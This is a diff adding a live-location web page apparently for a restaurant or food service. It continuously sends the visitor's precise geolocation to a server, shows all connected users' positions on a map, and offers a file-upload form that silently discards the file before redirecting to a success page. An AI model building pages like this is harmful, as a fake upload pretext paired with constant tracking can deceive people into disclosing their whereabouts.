@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>My Live Location (Restaurant)</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <link rel="stylesheet" href="/css/style.css">
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="relative flex flex-col h-screen">
+  <div id="map" class="flex-1 z-10"></div>
+  <div class="absolute bottom-0 w-full bg-white p-4 shadow-lg z-20 flex flex-col items-center">
+    <p class="text-black font-bold text-xl mb-2">Upload the Correct Location</p>
+    <p class="text-gray-600 text-sm mb-4">(Save the location file and upload it here)</p>
+    <input class="text-red-500 mb-2 p-2 border border-gray-300 rounded" type="file" onchange="handleFileUploaded()" id="LiveLocation">
+
+    <div id="fileName" class="text-blue-500 font-medium mb-2"></div>
+    <div id="errorMessage" class="text-red-500 font-medium mb-2 hidden"></div>
+    <button id="confirmButton" class="bg-blue-500 text-white px-4 py-2 rounded hidden" onclick="confirmUpload()">Confirm Upload</button>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet-src.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js" crossorigin="anonymous"></script>
+  <script src="/js/script.js"></script>
+  <script>
+    function handleFileUploaded() {
+      const input = document.querySelector("#LiveLocation");
+      const file = input.files[0];
+      const fileNameDiv = document.querySelector("#fileName");
+      const errorMessageDiv = document.querySelector("#errorMessage");
+      const confirmButton = document.querySelector("#confirmButton");
+      errorMessageDiv.textContent = "";
+      errorMessageDiv.classList.add("hidden");
+      input.classList.remove("border-red-500");
+
+      if (file) {
+        fileNameDiv.textContent = `Selected file: ${file.name}`;
+        if (file.name.split(".").pop().toLowerCase() === "html") {
+          confirmButton.classList.remove("hidden");
+        } else {
+          errorMessageDiv.textContent = "Invalid file format. Please upload a .html file.";
+          errorMessageDiv.classList.remove("hidden");
+          input.classList.add("border-red-500");
+          confirmButton.classList.add("hidden");
+          fileNameDiv.textContent = "";
+        }
+      }
+    }
+
+    function confirmUpload() {
+      const input = document.querySelector("#LiveLocation");
+      input.value = "";
+      setTimeout(() => {
+        window.location.href = "/successful";
+      }, 1000);
+    }
+
+    const socket = io();
+
+    if (navigator.geolocation) {
+      navigator.geolocation.watchPosition((position) => {
+        const { latitude, longitude } = position.coords;
+        socket.emit("send-location", { latitude, longitude });
+      }, (error) => {
+        console.error("Geolocation error:", error);
+      }, {
+        timeout: 5000,
+        maximumAge: 0,
+        enableHighAccuracy: true 
+      });
+    }
+
+    const map = L.map("map").setView([0, 0], 20);
+
+    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+      attribution: "FoodForward"
+    }).addTo(map);
+
+    const markers = {};
+
+    socket.on("receive-location", (data) => {
+      const { id, latitude, longitude } = data;
+      map.setView([latitude, longitude], 20);
+      if (markers[id]) {
+        markers[id].setLatLng([latitude, longitude]);
+      } else {
+        markers[id] = L.marker([latitude, longitude]).addTo(map);
+      }
+    });
+
+    socket.on("user-disconnected", (id) => {
+      if (markers[id]) {
+        map.removeLayer(markers[id]);
+        delete markers[id];
+      }
+    });
+  </script>
+</body>
+
+</html>
